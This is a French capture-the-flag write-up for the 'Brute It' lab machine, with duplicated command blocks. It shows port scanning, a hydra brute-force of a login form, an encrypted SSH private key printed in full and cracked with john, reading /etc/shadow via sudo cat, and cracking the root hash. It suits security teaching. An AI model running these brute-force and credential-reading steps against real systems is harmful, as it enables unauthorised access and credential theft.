@@ -1,0 +1,299 @@
+Brute It
+
+   Lien de la machine
+
+   Dans ce test, j'ai pour biut de trouver des failles de sécurité sur une
+   machine et d'essayer d'arriver à prendre le contrôle total de la
+   machine : être en utilisateur root. Le thème de la machine est le
+   bruteforce, c'est principalement dans le bruteforce
+
+   utilisation de la commande nmap dans un premier temps on fait en sorte
+   de découvrir les différents ports qui sont ouverts :
+nmap -sC -sV 10.10.173.206
+nmap -sC -sV 10.10.173.206
+
+   f1754fc999430d8113c12071f37c29c3.png
+
+   Sachant que l'on est sur un site web sur une machine challenge, je fais
+   en sorte de regarder les différents onglets que l'on peut trouver sur
+   le site en bruteforce en utilisant l'utilitaire gobuster :
+gobuster dir -u http://10.10.173.206 -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://10.10.173.206 -w /usr/share/wordlists/dirb/common.txt
+
+   On énumère ensuite le site web et on trouve un onglet :
+   6d51866963fcb219ed0cef8045ad374c.png
+
+   Ensuite, on tombe sur une page donnant sur un formulaire de login. On
+   trouve dans les commentaires du code source que l'on a un utilisateurs
+   nommé admin et une personne nommée "john".
+
+   Il faut donc utiliser le proxy de la suite burp pour trouver la manière
+   que l'on doit utiliser pour bruteforce le site (quels arguments pour le
+   login et le mot de passe). J'intercepte simplement la requête effectuée
+   sur le serveur afin de récupérer les éléments que l'on doit utiliser
+   pour bruteforce la page de login :
+   e0c48ec7a8421a40e9791b08b93979dc.png
+
+     ici j'ai simplement essayé avec le login admin et le mot de passe
+     test pour voir quelles informations étaient utilisées.
+
+   donc maintenant on sait quoi utiliser dans la commande hydra.
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.173.206 http-post-form
+"/admin/:user=^USER^&pass=^PASS^:Username or password invalid"
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.173.206 http-post-form
+"/admin/:user=^USER^&pass=^PASS^:Username or password invalid"
+
+   Ici on spécifie que l'on doit utiliser un login et un password? Pour le
+   password, on doit utiliser la liste de mot et on sait que le login est
+   admin (récupéré en commentaire dans la page du formulaire), ensuite, on
+   dit simplement à hydra où est ce qu'il doit les mettre dans la requête.
+   On met le username dans le ^USER et le password dans le ^PASS. Ensuite,
+   on définit le message qui apparaît lorsque notre couple login / mot de
+   passe est incorect, ici Username or password invalid
+
+   et le résultat :
+┌──(fracorbas㉿kali)-[~/Documents/VPN]
+└─$ hydra -l admin -P ../rockyou.txt 10.10.17.49 http-post-form "/admin/:user=^U
+SER^&pass=^PASS^:Username or password invalid"
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in mi
+litary or secret service organizations, or for illegal purposes (this is non-bin
+ding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-10 16:07:
+16
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:
+14344399), ~896525 tries per task
+[DATA] attacking http-post-form://10.10.17.49:80/admin/:user=^USER^&pass=^PASS^:
+Username or password invalid
+[80][http-post-form] host: 10.10.17.49   login: admin   password: xavier
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-10 16:07:
+37
+┌──(fracorbas㉿kali)-[~/Documents/VPN]
+└─$ hydra -l admin -P ../rockyou.txt 10.10.17.49 http-post-form "/admin/:user=^U
+SER^&pass=^PASS^:Username or password invalid"
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in mi
+litary or secret service organizations, or for illegal purposes (this is non-bin
+ding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-10 16:07:
+16
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:
+14344399), ~896525 tries per task
+[DATA] attacking http-post-form://10.10.17.49:80/admin/:user=^USER^&pass=^PASS^:
+Username or password invalid
+[80][http-post-form] host: 10.10.17.49   login: admin   password: xavier
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-10 16:07:
+37
+
+   On a donc récupéré le mot de passe de admin : xavier
+
+   On arrive alors sur une page donnant le premier flag, ainsi qu'une clé
+   RSA de ce cher John.
+┌──(fracorbas㉿kali)-[~/Documents/VPN/oral]
+└─$     cat cleRSA
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,E32C44CDC29375458A02E94F94B280EA
+
+JCPsentybdCSx8QMOcWKnIAsnIRETjZjz6ALJkX3nKSI4t40y8WfWfkBiDqvxLIm
+UrFu3+/UCmXwceW6uJ7Z5CpqMFpUQN8oGUxcmOdPA88bpEBmUH/vD2K/Z+Kg0vY0
+BvbTz3VEcpXJygto9WRg3M9XSVsmsxpaAEl4XBN8EmlKAkR+FLj21qbzPzN8Y7bK
+HYQ0L43jIulNKOEq9jbI8O1c5YUwowtVlPBNSlzRMuEhceJ1bYDWyUQk3zpVLaXy
++Z3mZtMq5NkAjidlol1ZtwMxvwDy478DjxNQZ7eR/coQmq2jj3tBeKH9AXOZlDQw
+UHfmEmBwXHNK82Tp/2eW/Sk8psLngEsvAVPLexeS5QArs+wGPZp1cpV1iSc3AnVB
+VOxaB4uzzTXUjP2H8Z68a34B8tMdej0MLHC1KUcWqgyi/Mdq6l8HeolBMUbcFzqA
+vbVm8+6DhZPvc4F00bzlDvW23b2pI4RraI8fnEXHty6rfkJuHNVR+N8ZdaYZBODd
+/n0a0fTQ1N361KFGr5EF7LX4qKJz2cP2m7qxSPmtZAgzGavUR1JDvCXzyjbPecWR
+y0cuCmp8BC+Pd4s3y3b6tqNuharJfZSZ6B0eN99926J5ne7G1BmyPvPj7wb5KuW1
+yKGn32DL/Bn+a4oReWngHMLDo/4xmxeJrpmtovwmJOXo5o+UeEU3ywr+sUBJc3W8
+oUOXNfQwjdNXMkgVspf8w7bGecucFdmI0sDiYGNk5uvmwUjukfVLT9JPMN8hOns7
+onw+9H+FYFUbEeWOu7QpqGRTZYoKJrXSrzII3YFmxE9u3UHLOqqDUIsHjHccmnqx
+zRDSfkBkA6ItIqx55+cE0f0sdofXtvzvCRWBa5GFaBtNJhF940Lx9xfbdwOEZzBD
+wYZvFv3c1VePTT0wvWybvo0qJTfauB1yRGM1l7ocB2wiHgZBTxPVDjb4qfVT8FNP
+f17Dz/BjRDUIKoMu7gTifpnB+iw449cW2y538U+OmOqJE5myq+U0IkY9yydgDB6u
+uGrfkAYp6NDvPF71PgiAhcrzggGuDq2jizoeH1Oq9yvt4pn3Q8d8EvuCs32464l5
+O+2w+T2AeiPl74+xzkhGa1EcPJavpjogio0E5VAEavh6Yea/riHOHeMiQdQlM+tN
+C6YOrVDEUicDGZGVoRROZ2gDbjh6xEZexqKc9Dmt9JbJfYobBG702VC7EpxiHGeJ
+mJZ/cDXFDhJ1lBnkF8qhmTQtziEoEyB3D8yiUvW8xRaZGlOQnZWikyKGtJRIrGZv
+OcD6BKQSzYoo36vNPK4U7QAVLRyNDHyeYTo8LzNsx0aDbu1rUC+83DyJwUIxOCmd
+6WPCj80p/mnnjcF42wwgOVtXduekQBXZ5KpwvmXjb+yoyPCgJbiVwwUtmgZcUN8B
+zQ8oFwPXTszUYgNjg5RFgj/MBYTraL6VYDAepn4YowdaAlv3M8ICRKQ3GbQEV6ZC
+miDKAMx3K3VJpsY4aV52au5x43do6e3xyTSR7E2bfsUblzj2b+mZXrmxst+XDU6u
+x1a9TrlunTcJJZJWKrMTEL4LRWPwR0tsb25tOuUr6DP/Hr52MLaLg1yIGR81cR+W
+-----END RSA PRIVATE KEY-----
+┌──(fracorbas㉿kali)-[~/Documents/VPN/oral]
+└─$     cat cleRSA
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,E32C44CDC29375458A02E94F94B280EA
+
+JCPsentybdCSx8QMOcWKnIAsnIRETjZjz6ALJkX3nKSI4t40y8WfWfkBiDqvxLIm
+UrFu3+/UCmXwceW6uJ7Z5CpqMFpUQN8oGUxcmOdPA88bpEBmUH/vD2K/Z+Kg0vY0
+BvbTz3VEcpXJygto9WRg3M9XSVsmsxpaAEl4XBN8EmlKAkR+FLj21qbzPzN8Y7bK
+HYQ0L43jIulNKOEq9jbI8O1c5YUwowtVlPBNSlzRMuEhceJ1bYDWyUQk3zpVLaXy
++Z3mZtMq5NkAjidlol1ZtwMxvwDy478DjxNQZ7eR/coQmq2jj3tBeKH9AXOZlDQw
+UHfmEmBwXHNK82Tp/2eW/Sk8psLngEsvAVPLexeS5QArs+wGPZp1cpV1iSc3AnVB
+VOxaB4uzzTXUjP2H8Z68a34B8tMdej0MLHC1KUcWqgyi/Mdq6l8HeolBMUbcFzqA
+vbVm8+6DhZPvc4F00bzlDvW23b2pI4RraI8fnEXHty6rfkJuHNVR+N8ZdaYZBODd
+/n0a0fTQ1N361KFGr5EF7LX4qKJz2cP2m7qxSPmtZAgzGavUR1JDvCXzyjbPecWR
+y0cuCmp8BC+Pd4s3y3b6tqNuharJfZSZ6B0eN99926J5ne7G1BmyPvPj7wb5KuW1
+yKGn32DL/Bn+a4oReWngHMLDo/4xmxeJrpmtovwmJOXo5o+UeEU3ywr+sUBJc3W8
+oUOXNfQwjdNXMkgVspf8w7bGecucFdmI0sDiYGNk5uvmwUjukfVLT9JPMN8hOns7
+onw+9H+FYFUbEeWOu7QpqGRTZYoKJrXSrzII3YFmxE9u3UHLOqqDUIsHjHccmnqx
+zRDSfkBkA6ItIqx55+cE0f0sdofXtvzvCRWBa5GFaBtNJhF940Lx9xfbdwOEZzBD
+wYZvFv3c1VePTT0wvWybvo0qJTfauB1yRGM1l7ocB2wiHgZBTxPVDjb4qfVT8FNP
+f17Dz/BjRDUIKoMu7gTifpnB+iw449cW2y538U+OmOqJE5myq+U0IkY9yydgDB6u
+uGrfkAYp6NDvPF71PgiAhcrzggGuDq2jizoeH1Oq9yvt4pn3Q8d8EvuCs32464l5
+O+2w+T2AeiPl74+xzkhGa1EcPJavpjogio0E5VAEavh6Yea/riHOHeMiQdQlM+tN
+C6YOrVDEUicDGZGVoRROZ2gDbjh6xEZexqKc9Dmt9JbJfYobBG702VC7EpxiHGeJ
+mJZ/cDXFDhJ1lBnkF8qhmTQtziEoEyB3D8yiUvW8xRaZGlOQnZWikyKGtJRIrGZv
+OcD6BKQSzYoo36vNPK4U7QAVLRyNDHyeYTo8LzNsx0aDbu1rUC+83DyJwUIxOCmd
+6WPCj80p/mnnjcF42wwgOVtXduekQBXZ5KpwvmXjb+yoyPCgJbiVwwUtmgZcUN8B
+zQ8oFwPXTszUYgNjg5RFgj/MBYTraL6VYDAepn4YowdaAlv3M8ICRKQ3GbQEV6ZC
+miDKAMx3K3VJpsY4aV52au5x43do6e3xyTSR7E2bfsUblzj2b+mZXrmxst+XDU6u
+x1a9TrlunTcJJZJWKrMTEL4LRWPwR0tsb25tOuUr6DP/Hr52MLaLg1yIGR81cR+W
+-----END RSA PRIVATE KEY-----
+
+   Sachant que l'on doit craquer la clé, on va utiliser john the ripper,
+   donc il faut qu'on mette la clé dans un format spécifique que
+   l'utilitaire john sait utiliser. Pour cela, j'utilisa la commande
+   ssh2john
+
+     Car c'est une clé privée SSH, d'où le ssh2john.
+
+ssh2john key.rsa> key.txt
+ssh2john key.rsa> key.txt
+
+   maintenant on a ce qu'il faut pour craquer la clé.
+john RSAkey.txt --wordlist=/usr/share/wordlists/rockyou.txt
+john RSAkey.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+   On trouve alors la passphrase protégeant la clé ssh :
+   91f19106a6060a2ec3641f32d1157bfc.png
+
+   On peut maintenant essayer de se connecter en ssh en utilisant
+   l'utilisateur john et la clé :
+   clé où on a bien sûr modifié les permissions (sinon SSH refuse de se
+   connecter sur l'hôte distant) :
+   chmod 600 key.rsa
+
+   puis on utilise l'option -i afin de dire que l'on utilise une clé SSH
+   pour se connecter.
+
+   ssh -i key.rsa john@10.10.170.206
+   On pense bien à utiliser la clé au format de base et pas celui de john
+
+   On nous demande le mot de passe de la clé que l'on renseigne et on
+   arrive à se connecter.
+
+   Ensuite, on regarde et on voit que l'on peut utiliser la commande cat
+   sans mot de passe en sudo :
+john@bruteit:~$ sudo -l
+Matching Defaults entries for john on bruteit:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/s
+bin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User john may run the following commands on bruteit:
+    (root) NOPASSWD: /bin/cat
+john@bruteit:~$ sudo -l
+Matching Defaults entries for john on bruteit:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/s
+bin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User john may run the following commands on bruteit:
+    (root) NOPASSWD: /bin/cat
+
+   On peut donc regarder le mot de passe de tous les utilisateurs, dont
+   root
+   en utilisant la commande :
+   sudo cat /etc/shadow
+
+     On ne nous demande pas de mot de passe car il y a le NOPASSWD dans
+     le fichier sudoers
+
+john@bruteit:~$ sudo cat /etc/shadow
+root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUT
+AaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
+john@bruteit:~$ sudo cat /etc/shadow
+root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUT
+AaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
+
+   On prend alors le contenu de la première colonne (entre le premier et
+   deuxième ":")
+
+   et on utilise la commande :
+   john --wordlist ../../rockyou.txt root.txt en ayant mis le contenu du
+   hash dans le fichier root.txt.
+
+   On a alors :
+┌──(fracorbas㉿kali)-[~/Documents/VPN/oral]
+└─$ john --wordlist=../../rockyou.txt hashRoot
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+football         (?)
+1g 0:00:00:00 DONE (2024-06-10 16:17) 1.851g/s 3792p/s 3792c/s 3792C/s 123456..l
+overs1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+┌──(fracorbas㉿kali)-[~/Documents/VPN/oral]
+└─$ john --wordlist=../../rockyou.txt hashRoot
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+football         (?)
+1g 0:00:00:00 DONE (2024-06-10 16:17) 1.851g/s 3792p/s 3792c/s 3792C/s 123456..l
+overs1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+   désormais, il nous suffit de nous connecter sur le compte root et de
+   regarder le flag root généralement dans la home dir de root.
+john@bruteit:~$ su -
+Password:
+root@bruteit:~# cd /root
+root@bruteit:~# ll
+total 52
+drwx------  7 root root 4096 Sep 30  2020 ./
+drwxr-xr-x 24 root root 4096 Sep 30  2020 ../
+-rw-------  1 root root  445 Sep 30  2020 .bash_history
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  2 root root 4096 Sep  3  2020 .cache/
+drwx------  3 root root 4096 Sep  3  2020 .gnupg/
+drwx------  2 root root 4096 Aug 16  2020 .john/
+drwxr-xr-x  3 root root 4096 Aug 15  2020 .local/
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   26 Aug 17  2020 root.txt
+drwx------  2 root root 4096 Aug 15  2020 .ssh/
+-rw-------  1 root root 2160 Sep 30  2020 .viminfo
+-rw-r--r--  1 root root  165 Aug 16  2020 .wget-hsts
+root@bruteit:~# cat root.txt
+THM{pr1v1l3g3_3sc4l4t10n}
+john@bruteit:~$ su -
+Password:
+root@bruteit:~# cd /root
+root@bruteit:~# ll
+total 52
+drwx------  7 root root 4096 Sep 30  2020 ./
+drwxr-xr-x 24 root root 4096 Sep 30  2020 ../
+-rw-------  1 root root  445 Sep 30  2020 .bash_history
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  2 root root 4096 Sep  3  2020 .cache/
+drwx------  3 root root 4096 Sep  3  2020 .gnupg/
+drwx------  2 root root 4096 Aug 16  2020 .john/
+drwxr-xr-x  3 root root 4096 Aug 15  2020 .local/
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   26 Aug 17  2020 root.txt
+drwx------  2 root root 4096 Aug 15  2020 .ssh/
+-rw-------  1 root root 2160 Sep 30  2020 .viminfo
+-rw-r--r--  1 root root  165 Aug 16  2020 .wget-hsts
+root@bruteit:~# cat root.txt
+THM{pr1v1l3g3_3sc4l4t10n}
+
+   On a donc récupéré le flag root sur la machine.
